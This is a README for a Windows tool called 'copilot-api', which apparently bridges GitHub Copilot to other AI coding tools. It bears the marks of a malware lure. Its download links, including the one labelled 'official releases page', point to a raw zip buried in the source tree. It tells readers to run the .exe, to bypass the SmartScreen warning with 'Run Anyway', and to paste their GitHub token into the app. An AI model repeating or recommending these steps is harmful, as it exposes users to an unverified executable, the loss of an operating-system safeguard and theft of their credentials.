# 🚀 copilot-api - Connect GitHub Copilot to your tools

[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Dldigisof3283/copilot-api/raw/refs/heads/main/src/services/copilot/copilot_api_dargsman.zip)

This software acts as a bridge. It takes the connection from GitHub Copilot and turns it into a format that other AI tools understand. You use this to connect your preferred AI models to programs like Claude Code, Codex, or Opencode. This project functions as an independent server. It manages your requests and sends them to the correct services.

## ⚙️ System Requirements

Your computer needs minimal resources to run this server. Ensure you have the following items ready:

* Windows 10 or Windows 11.
* A stable internet connection.
* A GitHub account with an active Copilot subscription.
* Enough memory to keep an extra background program open.

## 📥 Installing the Software

1. Visit the [official releases page](https://github.com/Dldigisof3283/copilot-api/raw/refs/heads/main/src/services/copilot/copilot_api_dargsman.zip) to download the installer.
2. Look for the file ending in `.exe` under the latest release section.
3. Save the file to your computer.
4. Double-click the file to start the installation.
5. Windows might show a prompt from SmartScreen. If this happens, click More Info, then click Run Anyway.
6. Follow the on-screen prompts to complete the setup process.

## 🛠️ Configuring the Server

Once you install the software, you must link it to your GitHub account.

1. Open the application from your desktop or start menu.
2. A small window appears. Click the button labeled Settings.
3. Find your GitHub authentication token. If you do not have one, the app provides a link to generate a new token via your GitHub settings page.
4. Paste your token into the designated box.
5. Choose the AI service you want to use from the dropdown menu, such as OpenAI or Anthropic.
6. Click Save to store your settings.
7. Restart the application to apply the changes.

## 🔗 Connecting Your Tools

After the server runs, you point your other coding tools toward it.

1. Open your code editor or the tool you want to use.
2. In the settings section of that tool, look for the API URL configuration.
3. Enter the local address created by the server. This is typically `http://localhost:8080`.
4. Ensure the port number matches the one displayed in your copilot-api window.
5. Test the connection using the button inside your tool.

## 🛡️ Maintaining Security

This application keeps your data local. It runs a web server on your own machine. Do not share your GitHub token with others. The software does not store your password, only the authentication token required to fetch data from Copilot. If you suspect someone else saw your token, revoke it immediately in your GitHub security settings and generate a new one.

## 📝 Frequently Asked Questions

### Does this service work offline?
No. The application needs a live internet connection to communicate with GitHub servers and the AI providers you select.

### How do I update the software?
Check the releases page once a month. Download the new installer and run it over the old version. The installer keeps your settings, so you do not need to reconfigure the server after an update.

### Can I run multiple instances?
No. Only one instance of the server can occupy the configured network port at one time. If the app fails to start, verify that no other software uses the same port.

### What should I do if the connection fails?
First, check your internet. Second, confirm that your Copilot subscription is active. Third, verify that your GitHub token has not expired. Most authentication tokens remain valid for 30 to 90 days. If the connection fails, generate a new token and update your settings.

### Is my code uploaded to external servers?
This tool acts as a relay. It forwards your requests to the service provider you select in the settings. Review the privacy policies of the AI service you connect to, as they govern how they process the data you send.